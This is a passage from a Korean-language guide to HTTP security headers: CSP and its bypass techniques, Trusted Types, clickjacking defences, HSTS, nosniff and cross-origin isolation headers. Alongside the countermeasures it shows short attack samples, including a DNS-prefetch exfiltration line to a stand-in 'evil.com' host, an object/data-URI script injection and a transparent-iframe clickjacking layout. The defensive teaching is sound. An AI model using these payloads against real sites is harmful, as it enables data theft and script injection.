│  대응: base-uri 'self' 또는 base-uri 'none' 추가                             │
│                                                                              │
│  우회 기법 4: object-src 미설정                                               │
│  ─────────────────────────────────────────────────────────────────            │
│  CSP: script-src 'nonce-abc' (object-src 없음 → default-src 적용)            │
│  공격: <object data="data:text/html,..."><script>alert(1)</script>            │
│  대응: object-src 'none' 명시                                                │
│                                                                              │
│  우회 기법 5: Script Gadget (프레임워크 내장 기능 악용)                        │
│  ─────────────────────────────────────────────────────────────────            │
│  CSP: script-src 'strict-dynamic' 'nonce-abc'                                │
│  공격: 이미 로드된 라이브러리(jQuery, Prototype)의 기능 악용                   │
│  대응: Trusted Types + 라이브러리 최신 버전 유지                               │
│                                                                              │
│  우회 기법 6: DNS Prefetch를 이용한 데이터 유출                                │
│  ─────────────────────────────────────────────────────────────────            │
│  CSP: connect-src 'self' (네트워크 요청 차단)                                 │
│  공격: <link rel="dns-prefetch" href="//stolen-data.evil.com">               │
│  대응: prefetch-src 'none', default-src 'self'                               │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

### 4.1.6 Google 권장 CSP (strict-dynamic + nonce)

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              Google 권장 Strict CSP                                            │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  Content-Security-Policy:                                                    │
│    script-src 'nonce-{RANDOM}' 'strict-dynamic' https: 'unsafe-inline';     │
│    object-src 'none';                                                        │
│    base-uri 'self';                                                          │
│    report-uri /csp-report                                                    │
│                                                                              │
│  왜 이 조합인가?                                                              │
│  ─────────────────────────────────────────────────────────────────            │
│                                                                              │
│  'nonce-{RANDOM}'                                                            │
│  ├── CSP Level 2+ 브라우저: nonce가 일치하는 스크립트만 실행                   │
│  └── 매 요청마다 서버에서 새 nonce 생성 (CSPRNG)                              │
│                                                                              │
│  'strict-dynamic'                                                            │
│  ├── CSP Level 3 브라우저: nonce 스크립트가 동적 생성한 스크립트도 허용         │
│  ├── allowlist (https:, 호스트) 무시 → nonce/hash만 유효                     │
│  └── document.createElement('script')로 생성한 스크립트 자동 허용             │
│                                                                              │
│  https: (fallback)                                                           │
│  ├── CSP Level 2 브라우저: strict-dynamic 미지원 시 HTTPS 출처 허용           │
│  └── CSP Level 3에서는 strict-dynamic이 이를 무시                             │
│                                                                              │
│  'unsafe-inline' (fallback)                                                  │
│  ├── CSP Level 1 브라우저: nonce 미지원 시 인라인 허용                         │
│  ├── CSP Level 2+: nonce가 있으면 unsafe-inline 자동 무시                    │
│  └── 하위 호환성 보장                                                         │
│                                                                              │
│  object-src 'none'                                                           │
│  └── Flash/Java Plugin 통한 XSS 차단                                         │
│                                                                              │
│  base-uri 'self'                                                             │
│  └── <base> 태그 주입 통한 스크립트 탈취 차단                                  │
│                                                                              │
│  브라우저별 해석:                                                              │
│  ┌───────────────────┬────────────────────────────────────────┐              │
│  │ CSP Level 3       │ nonce + strict-dynamic만 적용           │              │
│  │ (Chrome, Firefox) │ https:, unsafe-inline 무시              │              │
│  ├───────────────────┼────────────────────────────────────────┤              │
│  │ CSP Level 2       │ nonce 적용, strict-dynamic 무시         │              │
│  │                   │ unsafe-inline 무시 (nonce 우선)         │              │
│  ├───────────────────┼────────────────────────────────────────┤              │
│  │ CSP Level 1       │ unsafe-inline 적용 (nonce 미지원)       │              │
│  │ (매우 오래된)      │ 최소한의 보호                           │              │
│  └───────────────────┴────────────────────────────────────────┘              │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

### 4.1.7 GTM (Google Tag Manager) 허용 CSP

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              GTM과 CSP 공존 전략                                               │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  문제: GTM은 동적으로 서드파티 스크립트를 삽입함                                │
│        → strict CSP와 근본적 충돌                                             │
│                                                                              │
│  방법 1: nonce + strict-dynamic (권장)                                        │
│  ─────────────────────────────────────────────────────────────────            │
│  Content-Security-Policy:                                                    │
│    script-src 'nonce-{RANDOM}' 'strict-dynamic';                             │
│    style-src 'nonce-{RANDOM}';                                               │
│    img-src * data:;                                                          │
│    connect-src *;                                                            │
│    font-src *;                                                               │
│    object-src 'none';                                                        │
│    base-uri 'self'                                                           │
│                                                                              │
│  GTM 스크립트 태그에 nonce 추가:                                              │
│  <script nonce="{RANDOM}">                                                   │
│    (function(w,d,s,l,i){...})(window,document,'script','dataLayer','GTM-XX')│
│  </script>                                                                   │
│                                                                              │
│  strict-dynamic 덕분에 GTM이 동적 삽입하는 스크립트도 허용됨                   │
│                                                                              │
│  방법 2: GTM Custom Template + Server-Side GTM                               │
│  ─────────────────────────────────────────────────────────────────            │
│  ├── Server-Side GTM으로 서드파티 태그를 서버에서 처리                         │
│  ├── 브라우저에 직접 삽입되는 스크립트 최소화                                  │
│  └── 보안과 성능 모두 개선                                                    │
│                                                                              │
│  ⚠️  주의: GTM + CSP는 img-src, connect-src를 넓게 열어야 할 수 있음           │
│      → 리스크를 수용하거나 Server-Side GTM 전환 필요                           │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

### 4.1.8 CSP Reporting 구조

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              CSP 위반 보고서 구조                                               │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  보고서 예시 (report-uri 방식):                                               │
│  ─────────────────────────────────────────────────────────────────            │
│  POST /csp-report HTTP/1.1                                                   │
│  Content-Type: application/csp-report                                        │
│                                                                              │
│  {                                                                           │
│    "csp-report": {                                                           │
│      "document-uri": "https://example.com/page",                             │
│      "referrer": "",                                                         │
│      "violated-directive": "script-src-elem",                                │
│      "effective-directive": "script-src-elem",                               │
│      "original-policy": "script-src 'nonce-abc'; ...",                       │
│      "disposition": "enforce",                                               │
│      "blocked-uri": "https://evil.com/xss.js",                              │
│      "line-number": 42,                                                      │
│      "column-number": 8,                                                     │
│      "source-file": "https://example.com/page",                             │
│      "status-code": 200,                                                     │
│      "script-sample": "alert('xss')"                                        │
│    }                                                                         │
│  }                                                                           │
│                                                                              │
│  report-to (신규 Reporting API) 방식:                                        │
│  ─────────────────────────────────────────────────────────────────            │
│  Report-To: {"group":"csp","max_age":86400,                                  │
│              "endpoints":[{"url":"/csp-report"}]}                            │
│  Content-Security-Policy: ...; report-to csp                                 │
│                                                                              │
│  주의: 브라우저 확장, 광고 차단기 등이 대량의 허위 양성 보고서를 생성           │
│        → 필터링 파이프라인 필수 (User-Agent, blocked-uri 패턴 분석)            │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

## 4.2 X-XSS-Protection (Deprecated)

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              X-XSS-Protection — 사용하지 마라                                  │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  역사:                                                                        │
│  2010 ── IE8의 XSS Filter 등장, 이후 Chrome XSS Auditor 추가                 │
│  2019 ── Chrome 78에서 XSS Auditor 완전 제거                                  │
│  2020 ── 공식 deprecated                                                      │
│                                                                              │
│  왜 제거되었나?                                                               │
│  ─────────────────────────────────────────────────────────────────            │
│  XSS Auditor가 오히려 새로운 공격 벡터를 만들었기 때문:                         │
│                                                                              │
│  1. 선택적 차단 공격 (Selective Blocking)                                     │
│     공격자가 의도적으로 XSS 패턴을 주입하여                                    │
│     정상 스크립트를 차단시킴 → 보안 메커니즘 우회                              │
│                                                                              │
│  2. 정보 유출 (Information Leakage)                                           │
│     차단 여부를 관찰하여 페이지 내 특정 문자열 존재를                           │
│     확인 가능 → CSRF 토큰 추출                                               │
│                                                                              │
│  현재 권장 설정:                                                              │
│  ─────────────────────────────────────────────────────────────────            │
│  X-XSS-Protection: 0                                                         │
│                                                                              │
│  ⚠️  X-XSS-Protection: 1 또는 X-XSS-Protection: 1; mode=block 설정은        │
│     레거시 브라우저(IE)에서 위의 공격을 가능하게 하므로 명시적으로 0으로 설정    │
│                                                                              │
│  대체: CSP가 XSS 방어의 올바른 해결책                                         │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

## 4.3 Trusted Types (차세대 DOM XSS 방어)

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              Trusted Types — DOM XSS의 근본적 해결                             │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  문제: DOM XSS는 서버를 거치지 않고 클라이언트에서 발생                         │
│  ─────────────────────────────────────────────────────────────────            │
│  // DOM XSS 취약 코드                                                        │
│  element.innerHTML = userInput;          // 위험!                            │
│  document.write(userInput);              // 위험!                            │
│  eval(userInput);                        // 위험!                            │
│  location.href = userInput;              // 위험!                            │
│                                                                              │
│  Trusted Types 해결 방식:                                                    │
│  ─────────────────────────────────────────────────────────────────            │
│  위험한 Sink에 문자열 대신 "Trusted Type" 객체만 허용                          │
│                                                                              │
│  CSP 헤더:                                                                    │
│  Content-Security-Policy:                                                    │
│    require-trusted-types-for 'script';                                       │
│    trusted-types myPolicy default                                            │
│                                                                              │
│  JavaScript 정책 정의:                                                        │
│  ─────────────────────────────────────────────────────────────────            │
│  const policy = trustedTypes.createPolicy('myPolicy', {                      │
│    createHTML: (input) => {                                                  │
│      // DOMPurify로 sanitize                                                 │
│      return DOMPurify.sanitize(input);                                       │
│    },                                                                        │
│    createScriptURL: (input) => {                                             │
│      const url = new URL(input);                                             │
│      if (url.origin === location.origin) return input;                       │
│      throw new TypeError('Untrusted URL: ' + input);                        │
│    }                                                                         │
│  });                                                                         │
│                                                                              │
│  // 사용                                                                      │
│  element.innerHTML = policy.createHTML(userInput);  // ✅ 허용               │
│  element.innerHTML = userInput;                     // ❌ TypeError           │
│                                                                              │
│  효과:                                                                        │
│  ├── DOM Sink (innerHTML, document.write 등)에 직접 문자열 할당 차단           │
│  ├── 컴파일 타임이 아닌 런타임 타입 체크                                       │
│  ├── Gmail 2024: DOM XSS 발생 건수 0건 달성                                   │
│  └── 코드 리뷰 대상을 정책 정의 코드로 집중 (수천 개 Sink → 수 개 정책)        │
│                                                                              │
│  브라우저 지원: Chrome 83+, Edge 83+ (Firefox, Safari 진행 중)                │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

---

# 5. 클릭재킹 방어 헤더

## 5.1 클릭재킹 공격 원리

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              클릭재킹 (Clickjacking) 공격 메커니즘                              │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  공격 원리: 투명한 iframe 위에 유인 UI를 덮어씌움                               │
│                                                                              │
│  사용자가 보는 화면              실제 구조                                     │
│  ┌─────────────────────┐       ┌─────────────────────────────────────┐       │
│  │                     │       │  공격자 페이지 (evil.com)            │       │
│  │  🎁 무료 상품 받기!  │       │  ┌───────────────────────────────┐  │       │
│  │                     │       │  │  <iframe src="bank.com/transfer"│  │       │
│  │  [여기를 클릭하세요]  │       │  │   style="opacity: 0;           │  │       │
│  │                     │       │  │          position: absolute;   │  │       │
│  └─────────────────────┘       │  │          z-index: 999;">       │  │       │
│                                │  │  ┌─────────────────────────┐  │  │       │
│  사용자는 "무료 상품"을          │  │  │ [송금 확인] 버튼         │  │  │       │
│  클릭한다고 생각하지만           │  │  └─────────────────────────┘  │  │       │
│  실제로는 투명한 iframe의        │  └───────────────────────────────┘  │       │
│  "송금 확인" 버튼을 클릭함       │                                     │       │
│                                └─────────────────────────────────────┘       │
│                                                                              │
│  Grossman & Hansen (2008):                                                   │
│  "Clickjacking"은 Click + Hijacking의 합성어.                                │
│  상위 개념은 "UI Redressing" — UI 요소를 재배치하여 사용자를 속이는 공격       │
│                                                                              │
│  변형:                                                                        │
│  ├── Likejacking: SNS 좋아요 버튼 클릭 유도                                  │
│  ├── Cursorjacking: 커서 위치를 속여 다른 곳 클릭 유도                        │
│  ├── Drag-and-Drop Jacking: 드래그 앤 드롭으로 데이터 탈취                    │
│  └── Double-Click Jacking: 더블클릭 사이에 iframe 교체                       │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

## 5.2 X-Frame-Options

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              X-Frame-Options (RFC 7034)                                        │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  값 옵션:                                                                     │
│  ─────────────────────────────────────────────────────────────────            │
│  X-Frame-Options: DENY                                                       │
│  → 어떤 사이트도 이 페이지를 iframe으로 삽입할 수 없음                          │
│                                                                              │
│  X-Frame-Options: SAMEORIGIN                                                 │
│  → 동일 출처에서만 iframe 삽입 허용                                            │
│                                                                              │
│  X-Frame-Options: ALLOW-FROM https://trusted.com  ⚠️ deprecated             │
│  → 특정 출처 허용 (Chrome, Firefox 미지원!)                                   │
│                                                                              │
│  한계:                                                                        │
│  ├── 단일 출처만 지정 가능 (복수 출처 불가)                                    │
│  ├── ALLOW-FROM은 주요 브라우저에서 미지원                                    │
│  ├── 와일드카드, 경로 패턴 불가                                               │
│  └── CSP frame-ancestors로 대체 권장                                          │
│                                                                              │
│  그럼에도 사용하는 이유:                                                       │
│  ├── IE 11 등 구형 브라우저 호환                                              │
│  └── CSP frame-ancestors와 함께 사용 (Defense in Depth)                       │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

## 5.3 CSP frame-ancestors

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              CSP frame-ancestors (X-Frame-Options의 후계자)                    │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  Content-Security-Policy: frame-ancestors 'self' https://trusted.com         │
│                                                                              │
│  장점 (vs X-Frame-Options):                                                  │
│  ├── 복수 출처 지정 가능                                                      │
│  ├── 와일드카드 사용 가능 (*.trusted.com)                                     │
│  ├── 'none' 으로 완전 차단                                                    │
│  ├── CSP 정책의 일부로 통합 관리                                               │
│  └── 모든 최신 브라우저 지원                                                  │
│                                                                              │
│  예시:                                                                        │
│  ─────────────────────────────────────────────────────────────────            │
│  frame-ancestors 'none'                    # DENY와 동일                     │
│  frame-ancestors 'self'                    # SAMEORIGIN과 동일               │
│  frame-ancestors 'self' https://a.com      # self + 특정 출처                │
│  frame-ancestors https://*.trusted.com     # 서브도메인 와일드카드            │
│                                                                              │
│  ⚠️  중요: frame-ancestors는 <meta> 태그로 설정 불가!                         │
│     반드시 HTTP 헤더로 전송해야 한다.                                          │
│                                                                              │
│  마이그레이션 매핑:                                                            │
│  ┌────────────────────────────────┬────────────────────────────────────┐     │
│  │ X-Frame-Options               │ CSP frame-ancestors                │     │
│  ├────────────────────────────────┼────────────────────────────────────┤     │
│  │ DENY                          │ frame-ancestors 'none'             │     │
│  │ SAMEORIGIN                    │ frame-ancestors 'self'             │     │
│  │ ALLOW-FROM https://a.com      │ frame-ancestors https://a.com      │     │
│  │ (불가: 복수 출처)              │ frame-ancestors https://a.com      │     │
│  │                               │                  https://b.com     │     │
│  └────────────────────────────────┴────────────────────────────────────┘     │
│                                                                              │
│  권장: 두 헤더 동시 설정 (하위 호환성)                                         │
│  X-Frame-Options: DENY                                                       │
│  Content-Security-Policy: frame-ancestors 'none'                             │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

---

# 6. 전송 보안 헤더 (HSTS)

## 6.1 SSL Stripping 공격

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              SSL Stripping 공격과 HSTS의 필요성                                │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  SSL Stripping (Moxie Marlinspike, 2009 Black Hat):                          │
│  ─────────────────────────────────────────────────────────────────            │
│                                                                              │
│  정상 통신:                                                                   │
│  사용자 ──HTTPS──▶ bank.com                                                  │
│                                                                              │
│  SSL Stripping 공격:                                                         │
│  사용자 ──HTTP──▶ 공격자(MITM) ──HTTPS──▶ bank.com                           │
│         (평문!)     │                                                        │
│                     └── 사용자와는 HTTP로 통신                                │
│                         서버와는 HTTPS로 통신                                 │
│                         사이에서 데이터 탈취/변조                              │
│                                                                              │
│  공격 시나리오:                                                               │
│  1. 사용자가 카페 Wi-Fi 접속                                                  │
│  2. 주소창에 bank.com 입력 (HTTP로 요청)                                      │
│  3. 공격자가 HTTP 요청을 가로채 bank.com에 HTTPS로 중계                       │
│  4. bank.com은 정상 HTTPS 통신으로 인식                                       │
│  5. 사용자 브라우저에는 HTTP로 응답 전달 (자물쇠 없음)                          │
│  6. 사용자는 "자물쇠가 없네?" 정도로만 인지 (대부분 무시)                      │
│  7. 로그인 정보, 계좌번호 등 평문으로 탈취                                     │
│                                                                              │
│  핵심 문제: 최초 요청이 HTTP인 경우 보호 불가                                  │
│            → HSTS가 이를 해결                                                 │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

## 6.2 HSTS (HTTP Strict Transport Security)

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              HSTS (RFC 6797) 상세                                             │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  헤더 형식:                                                                   │
│  Strict-Transport-Security: max-age=31536000; includeSubDomains; preload     │
│                                                                              │
│  디렉티브:                                                                    │
│  ─────────────────────────────────────────────────────────────────            │
│  max-age=<seconds>                                                           │
│  ├── 브라우저가 HTTPS만 사용해야 하는 기간 (초)                                │
│  ├── 0: HSTS 비활성화 (정책 제거)                                             │
│  ├── 300: 5분 (테스트용)                                                     │
│  ├── 86400: 1일 (초기 배포)                                                   │
│  ├── 2592000: 30일 (중간 단계)                                                │
│  └── 31536000: 1년 (프로덕션 권장)                                            │
│                                                                              │
│  includeSubDomains                                                           │
│  ├── 모든 서브도메인에도 HSTS 적용                                            │
│  ├── ⚠️ HTTP만 사용하는 서브도메인이 있으면 접속 불가                           │
│  └── preload 등록 시 필수                                                    │
│                                                                              │
│  preload                                                                     │
│  ├── 브라우저 Preload List 등록 의사 표시                                     │
│  ├── hstspreload.org에서 등록                                                 │
│  ├── Chrome, Firefox, Safari, Edge 등 모든 주요 브라우저가 공유               │
│  └── TOFU 문제 해결 (최초 방문 전부터 HSTS 적용)                              │
│                                                                              │
│  동작 원리:                                                                   │
│  ─────────────────────────────────────────────────────────────────            │
│                                                                              │
│  최초 방문 (TOFU — Trust On First Use):                                      │
│  ┌──────────┐  HTTP  ┌──────────┐                                            │
│  │ 브라우저  │ ─────▶ │ 서버     │                                            │
│  └──────────┘        └────┬─────┘                                            │
│                           │ 301 Redirect → HTTPS                             │
│  ┌──────────┐  HTTPS ┌────▼─────┐                                            │
│  │ 브라우저  │ ─────▶ │ 서버     │                                            │
│  └──────────┘        └────┬─────┘                                            │
│                           │ HSTS 헤더: max-age=31536000                      │
│                           ▼                                                  │
│  브라우저: "bank.com은 1년간 HTTPS만 사용" 기억                               │
│                                                                              │
│  이후 방문:                                                                   │
│  ┌──────────┐                                                                │
│  │ 브라우저  │  사용자가 http://bank.com 입력                                 │
│  │          │  → 브라우저가 자체적으로 https://로 변환 (307 Internal Redirect) │
│  │          │  → 네트워크에 HTTP 요청 자체가 나가지 않음                       │
│  └──────────┘                                                                │
│                                                                              │
│  TOFU (Trust On First Use) 한계:                                             │
│  ─────────────────────────────────────────────────────────────────            │
│  최초 방문 시 HTTP 요청이 한 번은 발생하므로,                                  │
│  그 순간 SSL Stripping 가능                                                   │
│  → Preload List로 해결 (브라우저 출하 시부터 HSTS 적용)                       │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

## 6.3 HSTS Preload 등록 절차와 주의사항

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              HSTS Preload 등록                                                │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  등록 요구사항 (hstspreload.org):                                             │
│  ─────────────────────────────────────────────────────────────────            │
│  1. 유효한 SSL 인증서                                                        │
│  2. HTTP → HTTPS 301 리다이렉트 (같은 호스트)                                 │
│  3. 모든 서브도메인 HTTPS 지원                                                │
│  4. HSTS 헤더 조건:                                                          │
│     ├── max-age ≥ 31536000 (1년 이상)                                        │
│     ├── includeSubDomains 포함                                               │
│     └── preload 포함                                                         │
│                                                                              │
│  ⚠️  Preload 주의사항:                                                        │
│  ─────────────────────────────────────────────────────────────────            │
│  1. 등록 해제가 매우 어렵다 (수개월~수년 소요)                                 │
│     → 브라우저 업데이트 주기에 종속                                            │
│                                                                              │
│  2. 모든 서브도메인이 HTTPS를 지원해야 한다                                    │
│     ├── 내부 전용 서브도메인 (intranet.example.com)                           │
│     ├── 레거시 시스템 (legacy.example.com)                                    │
│     └── 이런 것들이 하나라도 HTTP면 접속 불가!                                 │
│                                                                              │
│  3. max-age를 점진적으로 늘려가며 테스트                                       │
│     300 (5분) → 86400 (1일) → 604800 (1주) → 2592000 (30일)                  │
│     → 31536000 (1년) → preload 등록                                          │
│                                                                              │
│  4. Preload 등록 전 최소 2주 이상 max-age=31536000으로 운영                   │
│                                                                              │
│  등록 흐름:                                                                   │
│  ─────────────────────────────────────────────────────────────────            │
│  단계 1: max-age=300 으로 HSTS 배포 → 문제 발생 시 5분 후 해제                │
│  단계 2: max-age=86400 으로 증가 → 1일 모니터링                               │
│  단계 3: max-age=604800 → 1주 모니터링                                        │
│  단계 4: max-age=31536000; includeSubDomains; preload                        │
│  단계 5: hstspreload.org 에서 도메인 등록 신청                                │
│  단계 6: Chrome Preload List에 포함 (다음 릴리스)                             │
│  단계 7: 다른 브라우저로 전파 (수주 소요)                                      │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

---

# 7. MIME/콘텐츠 보안 헤더

## 7.1 X-Content-Type-Options

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              X-Content-Type-Options: nosniff                                  │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  헤더:                                                                        │
│  X-Content-Type-Options: nosniff                                             │
│                                                                              │
│  유일한 유효 값: nosniff (다른 값 없음)                                        │
│                                                                              │
│  문제: MIME Type Sniffing                                                    │
│  ─────────────────────────────────────────────────────────────────            │
│  브라우저는 서버가 보낸 Content-Type을 무시하고                                 │
│  파일 내용을 분석하여 MIME 타입을 "추측"하는 경우가 있다.                       │
│                                                                              │
│  공격 시나리오:                                                               │
│  1. 공격자가 이미지 업로드 기능에 악성 HTML/JS를 업로드                         │
│  2. 서버: Content-Type: image/png 로 응답                                     │
│  3. 브라우저: "이 내용은 HTML 같은데?" → HTML로 해석 → XSS 실행               │
│                                                                              │
│  ┌─────────────┐     Content-Type: image/png     ┌──────────────┐           │
│  │  서버        │ ──────────────────────────────▶ │  브라우저      │           │
│  │  evil.png    │     (실제 내용: <script>...)     │              │           │
│  └─────────────┘                                  └──────┬───────┘           │
│                                                          │                   │
│                         nosniff 없음                      │ nosniff 있음      │
│                         ┌──────────────┐                 ┌──────────────┐    │
│                         │ MIME 스니핑    │                 │ 선언된 타입   │    │
│                         │ → HTML 감지   │                 │ 그대로 사용   │    │
│                         │ → 스크립트 실행│                 │ → image/png  │    │
│                         │ → ❌ XSS!     │                 │ → ✅ 안전    │    │
│                         └──────────────┘                 └──────────────┘    │
│                                                                              │
│  nosniff 동작:                                                                │
│  ├── script: Content-Type이 JavaScript MIME이 아니면 차단                     │
│  ├── style: Content-Type이 CSS MIME이 아니면 차단                              │
│  └── 기타 리소스: 선언된 Content-Type 그대로 사용                               │
│                                                                              │
│  구현: 가장 간단한 보안 헤더 (부작용 거의 없음)                                │
│  주의: Content-Type을 올바르게 설정하는 것이 전제 조건                          │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

---

# 8. Cross-Origin 보안 헤더 (Spectre 대응)

## 8.1 Spectre가 웹에 미친 영향

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              Spectre/Meltdown과 웹 보안                                       │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  2018년 1월: CPU 아키텍처의 투기 실행(Speculative Execution) 취약점 공개       │
│                                                                              │
│  웹에서의 영향:                                                               │
│  ─────────────────────────────────────────────────────────────────            │
│  같은 프로세스에서 실행되는 교차 출처 리소스의 메모리를                          │
│  JavaScript로 읽을 수 있게 됨                                                 │
│                                                                              │
│  공격 전:                                                                     │
│  ┌─────────────────────────────────────────┐                                 │
│  │  브라우저 프로세스                        │                                 │
│  │  ┌──────────┐  ┌──────────┐             │                                 │
│  │  │ site-a   │  │ site-b   │  ← 같은 프로세스                              │
│  │  │ (내 사이트)│  │ (은행)   │             │                                 │
│  │  └──────────┘  └──────────┘             │                                 │
│  │        ↑ Spectre로 site-b 메모리 읽기 가능!                                │
│  └─────────────────────────────────────────┘                                 │
│                                                                              │
│  대응: Site Isolation (프로세스 분리)                                         │
│  ┌──────────────┐  ┌──────────────┐                                         │
│  │  프로세스 A    │  │  프로세스 B    │                                         │
│  │  ┌──────────┐│  │  ┌──────────┐│                                         │
│  │  │ site-a   ││  │  │ site-b   ││  ← 별도 프로세스                         │
│  │  └──────────┘│  │  └──────────┘│                                         │
│  └──────────────┘  └──────────────┘                                         │
│                                                                              │
│  Site Isolation을 웹 표준으로 구현하는 헤더:                                   │
│  ├── Cross-Origin-Opener-Policy (COOP)                                       │
│  ├── Cross-Origin-Embedder-Policy (COEP)                                     │
│  └── Cross-Origin-Resource-Policy (CORP)                                     │
│                                                                              │
│  이 세 헤더를 함께 설정하면 "Cross-Origin Isolation" 상태가 된다.              │
│  crossOriginIsolated === true                                                │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

## 8.2 COOP (Cross-Origin-Opener-Policy)

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              COOP — 교차 출처 윈도우 참조 차단                                  │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  Cross-Origin-Opener-Policy: same-origin                                     │
│                                                                              │
│  값:                                                                          │
│  ─────────────────────────────────────────────────────────────────            │
│  unsafe-none (기본값)                                                        │
│  ├── 다른 출처 윈도우가 window.opener로 참조 가능                             │
│  └── Spectre 취약                                                            │
│                                                                              │
│  same-origin                                                                 │
│  ├── 동일 출처 + 동일 COOP 정책인 윈도우만 참조 가능                          │
│  └── 교차 출처 팝업/탭과 참조 완전 차단                                       │
│                                                                              │
│  same-origin-allow-popups                                                    │
│  ├── 자신이 열은 팝업과는 참조 유지                                           │
│  └── OAuth 팝업 플로우가 필요한 경우 사용                                     │
│                                                                              │
│  restrict-properties (실험적)                                                │
│  ├── 제한된 속성(postMessage, closed)만 접근 허용                             │
│  └── 통신 채널은 유지하면서 메모리 격리                                       │
│                                                                              │
│  Cross-Origin Isolation 조건:                                                │
│  COOP: same-origin + COEP: require-corp                                      │
│  → self.crossOriginIsolated === true                                         │
│  → SharedArrayBuffer, performance.measureUserAgentSpecificMemory() 사용 가능 │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

## 8.3 COEP (Cross-Origin-Embedder-Policy)

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              COEP — 교차 출처 리소스 로딩 제어                                  │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  Cross-Origin-Embedder-Policy: require-corp                                  │
│                                                                              │
│  값:                                                                          │
│  ─────────────────────────────────────────────────────────────────            │
│  unsafe-none (기본값)                                                        │
│  └── 제한 없이 교차 출처 리소스 로드 가능                                     │
│                                                                              │
│  require-corp                                                                │
│  ├── 모든 교차 출처 리소스가 CORP 헤더 또는 CORS 허용 필요                    │
│  └── 허용 없는 리소스는 로드 차단                                             │
│                                                                              │
│  credentialless (실험적)                                                     │
│  ├── 교차 출처 요청에서 자격 증명(쿠키, 인증서) 제거                          │
│  └── CORP 없이도 로드 가능하지만 인증된 리소스 접근 불가                       │
│                                                                              │
│  적용 시 주의:                                                                │
│  ─────────────────────────────────────────────────────────────────            │
│  require-corp 설정 시 모든 서드파티 리소스에 CORP 또는 CORS 필요:             │
│                                                                              │
│  <img src="https://cdn.other.com/image.png">                                 │
│  → cdn.other.com이 Cross-Origin-Resource-Policy: cross-origin 응답 필요     │
│  → 또는 CORS: Access-Control-Allow-Origin 헤더 필요                          │
│  → 둘 다 없으면 이미지 로드 차단!                                             │
│                                                                              │
│  → 서드파티 리소스 통제가 어려운 경우 credentialless 고려                      │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

## 8.4 CORP (Cross-Origin-Resource-Policy)

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              CORP — 리소스 측에서 교차 출처 로딩 허용/거부                       │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  Cross-Origin-Resource-Policy: same-origin                                   │
│                                                                              │
│  값:                                                                          │
│  ─────────────────────────────────────────────────────────────────            │
│  same-origin    동일 출처에서만 로드 허용                                     │
│  same-site      동일 사이트에서만 로드 허용 (서브도메인 포함)                  │
│  cross-origin   모든 출처에서 로드 허용                                       │
│                                                                              │
│  COOP/COEP/CORP 관계 정리:                                                   │
│  ─────────────────────────────────────────────────────────────────            │
│                                                                              │
│  ┌─────────────────────────────────────────────────────────────┐             │
│  │  사이트 A (COOP: same-origin, COEP: require-corp)           │             │
│  │                                                             │             │
│  │  <img src="https://cdn.b.com/logo.png">                     │             │
│  │        │                                                    │             │
│  │        │ COEP 검사: 이 리소스는 CORP 또는 CORS 있는가?       │             │
│  │        ▼                                                    │             │
│  └────────┼────────────────────────────────────────────────────┘             │
│           │                                                                  │
│  ┌────────▼────────────────────────────────────────────────────┐             │
│  │  CDN B (cdn.b.com)                                          │             │
│  │                                                             │             │
│  │  Cross-Origin-Resource-Policy: cross-origin  ✅ 로드 허용    │             │
│  │                            또는                              │             │
│  │  Access-Control-Allow-Origin: *              ✅ 로드 허용    │             │
│  │                            또는                              │             │
│  │  (아무 헤더 없음)                             ❌ 로드 차단    │             │
│  └─────────────────────────────────────────────────────────────┘             │
│                                                                              │
│  역할 분담:                                                                   │
│  COOP = 윈도우 간 참조 제어 (opener/popup)                                   │
│  COEP = 임베드 리소스 로딩 조건 설정 (소비자 측)                              │
│  CORP = 리소스가 어디서 로드될 수 있는지 선언 (제공자 측)                      │
│                                                                              │
